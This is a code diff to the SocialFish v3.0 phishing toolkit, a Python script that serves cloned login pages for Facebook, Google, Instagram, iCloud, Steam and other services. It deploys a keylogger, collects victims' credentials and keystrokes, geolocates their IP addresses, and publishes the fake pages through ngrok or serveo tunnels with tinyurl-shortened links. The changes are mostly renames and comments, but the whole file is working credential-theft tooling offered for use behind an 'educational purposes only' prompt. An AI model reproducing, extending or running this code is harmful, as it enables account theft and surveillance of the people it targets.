@@ -17,26 +17,26 @@ import json
 from subprocess import check_output
 
 
-RED, WHITE, CYAN, GREEN, END = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m', '\033[0m'
+RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
 
-def connected(host='http://duckduckgo.com'):
+def connected(host='http://duckduckgo.com'): #Checking network connection.
     try:
         urlopen(host)
         return True
     except:
         return False
-if connected() == False:
+if connected() == False: #If there no network
      print ('''
   ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _
       /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|
       \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
           \|
                     {0}[{1}!{0}]{1} Network error. Verify your connection.\n
-'''.format(RED, END))
+'''.format(RED, DEFAULT))
      exit(0)
-    
-def checkNgrok():
-    if path.isfile('Server/ngrok') == False: 
+
+def checkNgrok(): #Check if user already have Ngrok server, if False - downloading it.
+    if path.isfile('Server/ngrok') == False:
         print('[*] Downloading Ngrok...')
         if 'Android' in str(check_output(('uname', '-a'))):
             filename = 'ngrok-stable-linux-arm.zip'
@@ -54,7 +54,7 @@ def checkNgrok():
         system('clear')
 checkNgrok()
 
-def end():
+def end(): #Message when SocialFish exit
     system('clear')
     print ('''
                    S O C I A L{2}
@@ -66,8 +66,8 @@ def end():
                           {1}F I S H{2}                ~--___--~
                {0}NOW WITH LIVE VICTIM ATTACK INFORMATION ]
           {0}A KEYLOGGER IS DEPLOYED FOR YOU, TO CAPTURE EVERY KEYSTROKE ]
-{1}[ {0} Some more phising pages have been added in script. For a better Attack]
-[ {0} WELCOME TO SOCIALFISH V3.0  by-An0nUD4Y]\n'''.format(GREEN, END, CYAN))
+   [ {0} Some more phising pages have been added in script. For a better Attack]
+[ {0} WELCOME TO SOCIALFISH V3.0  by-An0nUD4Y]\n {1}'''.format(GREEN, DEFAULT, CYAN))
 
 def loadModule(module):
        print ('''{0}
@@ -77,73 +77,73 @@ def loadModule(module):
  `=.____.="  `._\\
 
 
- [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module)
+ [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, DEFAULT) % module)
 
-def runPhishing(social, option2):
+def runPhishing(page, option2): #Phishing pages selection menu
     system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/')
-    if option2 == '1' and social == 'Facebook':
+    if option2 == '1' and page == 'Facebook':
         copy_tree("WebPages/fb_standard/", "Server/www/")
-    if option2 == '2' and social == 'Facebook':
+    if option2 == '2' and page == 'Facebook':
         copy_tree("WebPages/fb_advanced_poll/", "Server/www/")
-    if option2 == '3' and social == 'Facebook':
+    if option2 == '3' and page == 'Facebook':
         copy_tree("WebPages/fb_security_fake/", "Server/www/")
-    if option2 == '4' and social == 'Facebook':
+    if option2 == '4' and page == 'Facebook':
         copy_tree("WebPages/fb_messenger/", "Server/www/")
-    elif option2 == '1' and social == 'Google':
+    elif option2 == '1' and page == 'Google':
         copy_tree("WebPages/google_standard/", "Server/www/")
-    elif option2 == '2' and social == 'Google':
+    elif option2 == '2' and page == 'Google':
         copy_tree("WebPages/google_advanced_poll/", "Server/www/")
-    elif option2 == '3' and social == 'Google':
+    elif option2 == '3' and page == 'Google':
         copy_tree("WebPages/google_advanced_web/", "Server/www/")
-    elif social == 'LinkedIn':
+    elif page == 'LinkedIn':
         copy_tree("WebPages/linkedin/", "Server/www/")
-    elif social == 'GitHub':
+    elif page == 'GitHub':
         copy_tree("WebPages/GitHub/", "Server/www/")
-    elif social == 'StackOverflow':
+    elif page == 'StackOverflow':
         copy_tree("WebPages/stackoverflow/", "Server/www/")
-    elif social == 'WordPress':
+    elif page == 'WordPress':
         copy_tree("WebPages/wordpress/", "Server/www/")
-    elif social == 'Twitter':
+    elif page == 'Twitter':
         copy_tree("WebPages/twitter/", "Server/www/")
-    elif social == 'Snapchat':
+    elif page == 'Snapchat':
         copy_tree("WebPages/Snapchat_web/", "Server/www/")
-    elif social == 'Yahoo':
+    elif page == 'Yahoo':
         copy_tree("WebPages/yahoo_web/", "Server/www/")
-    elif social == 'Twitch':
+    elif page == 'Twitch':
         copy_tree("WebPages/twitch/", "Server/www/")
-    elif social == 'Microsoft':
+    elif page == 'Microsoft':
         copy_tree("WebPages/live_web/", "Server/www/")
-    elif social == 'Steam':
+    elif page == 'Steam':
         copy_tree("WebPages/steam/", "Server/www/")
-    elif social == 'iCloud':
-        copy_tree("WebPages/iCloud/", "Server/www/")    
-    elif option2 == '1' and social == 'Instagram':
+    elif page == 'iCloud':
+        copy_tree("WebPages/iCloud/", "Server/www/")
+    elif option2 == '1' and page == 'Instagram':
         copy_tree("WebPages/Instagram_web/", "Server/www/")
-    elif option2 == '2' and social == 'Instagram':
+    elif option2 == '2' and page == 'Instagram':
         copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
-    elif option2 == '1' and social == 'VK':
+    elif option2 == '1' and page == 'VK':
         copy_tree("WebPages/VK/", "Server/www/")
-    elif option2 == '2' and social == 'VK':
+    elif option2 == '2' and page == 'VK':
         copy_tree("WebPages/VK_poll_method/", "Server/www/")
 
 
 didBackground = True
 logFile = None
 for arg in argv:
-    if arg=="--nolog":
+    if arg=="--nolog": #If true - don't log
         didBackground = False
 if didBackground:
     logFile = open("log.txt", "w")
 
 
-def log(ctx):
-    if didBackground:
-        logFile.write(ctx.replace(RED, "").replace(WHITE, "").replace(CYAN, "").replace(GREEN, "").replace(END, "") + "\n")
+def log(ctx): #Writing log
+    if didBackground: #if didBackground == True, write
+        logFile.write(ctx.replace(RED, "").replace(WHITE, "").replace(CYAN, "").replace(GREEN, "").replace(DEFAULT, "") + "\n")
     print(ctx)
 
 
 def waitCreds():
-    print("{0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END))
+    print("{0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, DEFAULT))
 
     print('''{0}
    _.-=-._     .-,
@@ -152,18 +152,18 @@ def waitCreds():
  `=.____.="  `._\\
 
  [{1}*{0}]{1} WE HAVE ALSO DEPLOYED A KEYLOGGER. .
- [{1}*{0}]{1} YOU WILL GET VICTIM'S DEVICES INFO.{0}'''.format(CYAN, END))
+ [{1}*{0}]{1} YOU WILL GET VICTIM'S DEVICES INFO.{0}'''.format(CYAN, DEFAULT))
 
-    print(" {0}[{1}*{0}]{1} Waiting for credentials//Pressed keys//Victim's device info... \n".format(RED, END))
+    print(" {0}[{1}*{0}]{1} Waiting for credentials//Pressed keys//Victim's device info... \n".format(RED, DEFAULT))
     while True:
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                log('======================================================================'.format(RED, END))
-                log(' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
+                log('======================================================================'.format(RED, DEFAULT))
+                log(' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                 system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
-                log('======================================================================'.format(RED, END))
-                log(' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, END))
+                log('======================================================================'.format(RED, DEFAULT))
+                log(' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, DEFAULT))
 
         creds.close()
 
@@ -175,35 +175,35 @@ def waitCreds():
                 resp = urlopen('https://ipinfo.io/%s/json' % ip)
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
-                    log('======================================================================'.format(RED, END))
-                    log(' \n{0}[ VICTIM IP BOGUS ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
+                    log('======================================================================'.format(RED, DEFAULT))
+                    log(' \n{0}[ VICTIM IP BONUS ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                 else:
                     matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                     latitude = matchObj.group(1)
                     longitude = matchObj.group(2)
-                    log('======================================================================'.format(RED, END))
-                    log(' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
-                    log(' \n{0}Longitude: %s \nLatitude: %s{1}'.format(GREEN, END) % (longitude, latitude))
-                    log(' \n{0}ISP: %s \nCountry: %s{1}'.format(GREEN, END) % (ipinfo['org'], ipinfo['country']))
-                    log(' \n{0}Region: %s \nCity: %s{1}'.format(GREEN, END) % (ipinfo['region'], ipinfo['city']))
+                    log('======================================================================'.format(RED, DEFAULT))
+                    log(' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
+                    log(' \n{0}Longitude: %s \nLatitude: %s{1}'.format(GREEN, DEFAULT) % (longitude, latitude))
+                    log(' \n{0}ISP: %s \nCountry: %s{1}'.format(GREEN, DEFAULT) % (ipinfo['org'], ipinfo['country']))
+                    log(' \n{0}Region: %s \nCity: %s{1}'.format(GREEN, DEFAULT) % (ipinfo['region'], ipinfo['city']))
                 system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
-                log('======================================================================'.format(RED, END))
+                log('======================================================================'.format(RED, DEFAULT))
 
         creds.close()
-        
+
         with open('Server/www/KeyloggerData.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                log('______________________________________________________________________'.format(RED, END))
-                log(' {0}[ GETTING PRESSED KEYS ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
+                log('______________________________________________________________________'.format(RED, DEFAULT))
+                log(' {0}[ GETTING PRESSED KEYS ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                 system('rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
-                log('______________________________________________________________________'.format(RED, END))
-                
+                log('______________________________________________________________________'.format(RED, DEFAULT))
+
 
         creds.close()
 
 
-def runPEnv():
+def runPEnv(): #menu where user select what they wanna use
     system('clear')
     print ('''           {2}-{1} An0nUD4Y {2}|{1} An0nUD4Y {2}|{1} An0nUD4Y {2}- INDIA
                        .   .  .
@@ -218,35 +218,35 @@ def runPEnv():
          '  .                     .     '          '     '  {1}v3.0{2}
                '  .  .  .  .  . '.    .'              '  .
                    '         '    '. '  {1}Updated_By--> AnonUD4Y_{2}
- _________________________________________________________________________________                  
+ _________________________________________________________________________________
           {0}[ NOW WITH LIVE VICTIM ATTACK INFORMATION ]
           {0}A KEYLOGGER WILL BE DEPLOYED FOR YOU, TO CAPTURE EVERY KEYSTROKE ]
- _________________________________________________________________________________                      
-                             {1}'''.format(GREEN, END, CYAN))
+ _________________________________________________________________________________
+                             {1}'''.format(GREEN, DEFAULT, CYAN))
 
     for i in range(101):
         sleep(0.01)
-        stdout.write("\r{0}[{1}*{0}]{1} Preparing environment... %d%%".format(CYAN, END) % i)
+        stdout.write("\r{0}[{1}*{0}]{1} Preparing environment... %d%%".format(CYAN, DEFAULT) % i)
         stdout.flush()
 
-    print ("\n\n{0}[{1}*{0}]{1} Searching for PHP installation... ".format(CYAN, END))
-    if 256 != system('which php'):
-        print (" --{0}>{1} OK.".format(CYAN, END))
+    print ("\n\n{0}[{1}*{0}]{1} Searching for PHP installation... ".format(CYAN, DEFAULT))
+    if 256 != system('which php'): #Checking if user have PHP
+        print (" --{0}>{1} OK.".format(CYAN, DEFAULT))
     else:
-        print (" --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again.http://www.php.net/".format(RED, END))
+        print (" --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again.http://www.php.net/".format(RED, DEFAULT))
         exit(0)
-    if input(" {0}[{1}!{0}]{1} Do you agree to use this tool for educational purposes only? (y/n)\n {2}SF-An0nUD4Y > {1}".format(RED, END, CYAN)).upper() != 'Y':
+    if input(" {0}[{1}!{0}]{1} Do you agree to use this tool for educational purposes only? (y/n)\n {2}SF-An0nUD4Y > {1}".format(RED, DEFAULT, CYAN)).upper() != 'Y': #Question where user must accept education purposes
         system('clear')
-        print ('\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU NEED A GOOD MIND AND SOUL TO BE ONE OF US. GET AWAY FROM HERE AND DO NOT COME BACK WITH SAME MOTIVE. GOOD BYE!{1} ]\n'.format(RED, END))
+        print ('\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU NEED A GOOD MIND AND SOUL TO BE ONE OF US. GET AWAY FROM HERE AND DO NOT COME BACK WITH SAME MOTIVE. GOOD BYE!{1} ]\n'.format(RED, DEFAULT))
         exit(0)
-    option = input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With   An0nUD4Y !\n\n {0}SF-An0nUD4Y >  {1}".format(CYAN, END))
+    option = input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With   An0nUD4Y !\n\n {0}SF-An0nUD4Y >  {1}".format(CYAN, DEFAULT))
     if option == '1':
         loadModule('Facebook')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
         runPhishing('Facebook', option2)
     elif option == '2':
         loadModule('Google')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
         runPhishing('Google', option2)
     elif option == '3':
         loadModule('LinkedIn')
@@ -270,7 +270,7 @@ def runPEnv():
         runPhishing('Twitter', option2)
     elif option == '8':
         loadModule('Instagram')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
         runPhishing('Instagram', option2)
     elif option == '9':
         loadModule('Snapchat')
@@ -294,27 +294,27 @@ def runPEnv():
         runPhishing('Steam', option2)
     elif option == '14':
         loadModule('VK')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
         runPhishing('VK', option2)
     elif option == '15':
         loadModule('iCloud')
         option2 = ''
-        runPhishing('iCloud', option2)    
+        runPhishing('iCloud', option2)
     else:
         exit(0)
 
 
-    
-def serveo():
+
+def runServeo():
     system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > link.url 2> /dev/null &')
     sleep(7)
     output = check_output("grep -o 'https://[0-9a-z]*\.serveo.net' link.url", shell=True)
     url = str(output).strip("b ' \ n")
-    print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(CYAN, END, GREEN) + url + "{1}".format(CYAN, END, GREEN))
+    print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(CYAN, DEFAULT, GREEN) + url + "{1}".format(CYAN, DEFAULT, GREEN))
     link = check_output("curl -s 'http://tinyurl.com/api-create.php?url='"+url, shell=True).decode().replace('http', 'https')
-    print("\n {0}[{1}*{0}]{1} TINYURL: {2}".format(CYAN, END, GREEN) + link + "{1}".format(CYAN, END, GREEN))
+    print("\n {0}[{1}*{0}]{1} TINYURL: {2}".format(CYAN, DEFAULT, GREEN) + link + "{1}".format(CYAN, DEFAULT, GREEN))
     print("\n")
-        
+
 def runNgrok():
     system('./Server/ngrok http 1111 > /dev/null &')
     while True:
@@ -324,23 +324,23 @@ def runNgrok():
         url = urlFile.read()
         urlFile.close()
         if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
-            print("\n {0}[{1}*{0}]{1} Ngrok URL: {2}".format(CYAN, END, GREEN) + url + "{1}".format(CYAN, END, GREEN))
+            print("\n {0}[{1}*{0}]{1} Ngrok URL: {2}".format(CYAN, DEFAULT, GREEN) + url + "{1}".format(CYAN, DEFAULT, GREEN))
             link = check_output("curl -s 'http://tinyurl.com/api-create.php?url='"+url, shell=True).decode().replace('http', 'https')
-            print("\n {0}[{1}*{0}]{1} TINYURL: {2}".format(CYAN, END, GREEN) + link + "{1}".format(CYAN, END, GREEN))
+            print("\n {0}[{1}*{0}]{1} TINYURL: {2}".format(CYAN, DEFAULT, GREEN) + link + "{1}".format(CYAN, DEFAULT, GREEN))
             print("\n")
             break
-    
-    
+
+
 def runServer():
     system("cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null 2>&1 &")
-    
+
 if __name__ == "__main__":
     try:
         runPEnv()
-        def custom():
-            print("\n Insert a custom redirect url: ")
-            custom = input('\n SF-An0nUD4Y > ')
-            if 'http://' in custom:
+        def custom(): #Question where user can input custom web-link
+            print("\n {0}Insert a custom redirect url:".format(CYAN, DEFAULT))
+            custom = input("\n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
+            if 'http://' or 'https://' in custom:
                 pass
             else:
                 custom = 'http://' + custom
@@ -365,21 +365,21 @@ if __name__ == "__main__":
                 f.write(c)
                 f.close()
         custom()
-        def server():
-                print("\n Server you want to use".format(CYAN, END))
-                print("\n {0}[{1}1{0}]{1} Ngrok\n {0}[{1}2{0}]{1} Serveo".format(CYAN, END))
-                choice = input(" \n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
+        def server(): #Question where user must select server
+                print("\n {0}Please select any available server:{1}".format(CYAN, DEFAULT))
+                print("\n {0}[{1}1{0}]{1} Ngrok\n {0}[{1}2{0}]{1} Serveo".format(CYAN, DEFAULT))
+                choice = input(" \n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
                 if choice == '1':
                     runNgrok()
                 elif choice == '2':
-                    serveo()
+                    runServeo()
                 else:
                     system('clear')
                     return server()
         server()
         multiprocessing.Process(target=runServer).start()
-        waitCreds()           
+        waitCreds()
 
-    except KeyboardInterrupt: 
+    except KeyboardInterrupt:
         end()
         exit(0)
